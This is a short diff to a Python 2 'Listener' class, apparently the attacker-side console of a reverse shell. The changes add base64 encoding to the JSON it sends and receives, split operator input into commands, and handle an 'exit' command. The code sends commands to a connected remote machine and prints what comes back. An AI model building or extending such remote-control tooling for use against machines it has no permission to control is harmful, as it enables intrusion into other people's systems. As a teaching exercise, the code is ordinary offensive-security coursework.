@@ -1,4 +1,4 @@
-import socket, json
+import socket, json, base64
 
 
 class Listener:
@@ -15,14 +15,14 @@ class Listener:
 
     def reliable_send(self,data):
         jason_data = json.dumps(data)
-        self.connection.send(jason_data)
+        self.connection.send(base64.b64encode(jason_data))
 
     def reliable_receive(self):
         json_data=""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data)
+                return json.loads(base64.b64decode(json_data))
             except ValueError:
                 continue
 
@@ -30,11 +30,14 @@ class Listener:
 
     def execute_remotely(self,command):
         self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
         return self.reliable_receive()
 
     def run(self):
         while True:
-            user_input=raw_input(">> ")
+            user_input=raw_input(">> ").split(' ')
             result = self.execute_remotely(user_input)
             print(result)
 
